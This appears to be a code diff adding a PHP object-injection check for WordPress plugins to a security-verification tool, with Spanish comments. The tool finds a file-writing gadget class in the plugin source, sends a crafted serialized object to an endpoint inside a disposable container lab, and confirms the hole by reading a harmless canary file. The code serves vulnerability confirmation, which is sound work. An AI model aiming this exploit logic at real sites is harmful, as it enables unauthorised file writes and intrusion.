@@ -64,6 +64,7 @@ _XML_HINTS = ("xml", "feed", "data", "content", "body", "payload", "import")
 _REDIRECT_HINTS = ("redirect", "url", "return", "next", "target", "dest", "destination",
                    "continue", "go", "out", "location")
 _FILE_UPLOAD_HINTS = ("file", "upload", "avatar", "image", "attachment", "document", "photo")
+_SERIAL_HINTS = ("data", "payload", "value", "options", "settings", "meta", "object", "serialized")
 
 
 @dataclass
@@ -2531,6 +2532,130 @@ def verify_wordpress_csrf(
                           f"SI compruebe nonce/origen, o que el payload/endpoint no sean los "
                           f"reales)")
         res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red/volumen)...")
+        lab.teardown()
+
+
+def verify_wordpress_deserialization(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, serial_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Verifica insecure deserialization (PHP Object Injection) en DOS pasos, ambos con prueba
+    dura (ver deserialize_gadgets.py para el porque de este diseño):
+
+    1) ESTATICO: escanea el codigo REAL ya descargado del plugin (find_file_write_gadget) en
+       busca de una clase con __wakeup()/__destruct() que escriba una propiedad publica
+       (controlada por el atacante) a una ruta tambien publica (controlada por el atacante) via
+       file_put_contents(). Si no encuentra ninguna, no se intenta nada mas -- sin un gadget real
+       en el propio codigo, no hay nada que verificar sin inventarse una cadena de terceros.
+    2) DINAMICO: construye el objeto PHP serializado de verdad con esa clase (secrets.token_hex
+       como contenido, una ruta canario como destino), lo manda al parametro/endpoint que la
+       hipotesis cita, y confirma leyendo el fichero REAL dentro del contenedor -- si el
+       CONTENIDO EXACTO aparece ahi, es prueba de que unserialize() reconstruyo el objeto de
+       verdad y su metodo magico se ejecuto, no una deduccion por status code."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    from .deserialize_gadgets import find_file_write_gadget, build_php_serialized_object
+    plugin_root = os.path.join(plugin_source_dir, slug)
+    step("escaneando el codigo real en busca de un gadget de deserializacion (clase con "
+         "__wakeup()/__destruct() que escriba a fichero)...")
+    gadget = find_file_write_gadget(plugin_root)
+    if gadget is None:
+        res.detail = ("no se encontro ningun gadget de deserializacion en el codigo del plugin "
+                      "(una clase con __wakeup()/__destruct() que escriba una propiedad publica "
+                      "a una ruta publica via file_put_contents())")
+        res.limitations.append("la verificacion de deserializacion SOLO cubre gadgets dentro del "
+                               "propio codigo del plugin (no cadenas de librerias de terceros "
+                               "como Monolog/Guzzle -- eso necesitaria PHPGGC u otra herramienta "
+                               "dedicada); si el plugin no trae una clase asi, no hay nada que "
+                               "verificar sin inventarse una cadena que no esta")
+        return res
+    step(f"gadget encontrado: clase '{gadget.full_class_name}' en {gadget.file}:{gadget.line} "
+         f"({gadget.magic_method} -> file_put_contents($this->{gadget.path_prop}, "
+         f"$this->{gadget.content_prop}))")
+
+    serial_param = serial_param_hint or _pick_param(parameters, _SERIAL_HINTS)
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+
+        secret = secrets.token_hex(16)
+        canary_path = f"/tmp/binoracle_deser_{_token()}.txt"
+        payload_obj = build_php_serialized_object(gadget, canary_path, secret)
+        m = (http_method or "POST").upper()
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "gadget_clase": gadget.full_class_name, "gadget_metodo": gadget.magic_method,
+            "gadget_ubicacion": f"{gadget.file}:{gadget.line}", "canary_path": canary_path,
+            "canary_secret": secret, "objeto_serializado": payload_obj,
+            "serial_param": serial_param or "(cuerpo crudo)", "metodo": m, "endpoint": endpoint,
+        })
+
+        tried = []
+        found = False
+
+        def try_send(label, **kwargs):
+            nonlocal found
+            step(f"probando {m} {endpoint} ({label})...")
+            try:
+                boot.sub_sess.request(m, boot.base_url + endpoint, timeout=20, **kwargs)
+            except Exception as e:
+                tried.append({"modo": label, "error": str(e)})
+                return
+            time.sleep(1)   # el __destruct() puede dispararse al final de la peticion, no antes
+            r = lab.sh("exec", lab.wp, "sh", "-c", f"cat {canary_path} 2>/dev/null", timeout=10)
+            content = (r.stdout or "")
+            present = secret in content
+            tried.append({"modo": label, "secreto_presente": present})
+            if present and not found:
+                found = True
+                res.evidence["modo_ganador"] = label
+                res.evidence["contenido_fichero"] = content[:500]
+                step(f"VERIFICADO: el fichero {canary_path} contiene el secreto exacto -- "
+                     f"unserialize() reconstruyo el objeto y {gadget.magic_method} se ejecuto.")
+
+        if serial_param:
+            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload[serial_param] = payload_obj
+            try_send("parametro de formulario",
+                     data=payload if m != "GET" else None,
+                     params=payload if m == "GET" else None)
+        if not found:
+            try_send("cuerpo crudo", data=payload_obj.encode())
+
+        res.evidence["intentos"] = tried
+        if found:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"DESERIALIZATION confirmada ({res.evidence['modo_ganador']}): el "
+                          f"objeto PHP serializado de la clase '{gadget.full_class_name}' se "
+                          f"reconstruyo de verdad y su {gadget.magic_method} escribio el secreto "
+                          f"exacto en {canary_path} -- prueba inequivoca de PHP Object Injection, "
+                          f"no una deduccion por status code")
+        else:
+            res.ok = True
+            res.detail = (f"se encontro el gadget '{gadget.full_class_name}' en el codigo pero "
+                          f"ninguna forma de mandarlo ({len(tried)} probadas) hizo que el "
+                          f"fichero canario apareciera con el secreto -- la deserializacion no "
+                          f"se confirmo (puede que el endpoint/parametro no sean los reales, o "
+                          f"que el valor no se pase a unserialize() sin filtrar)")
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
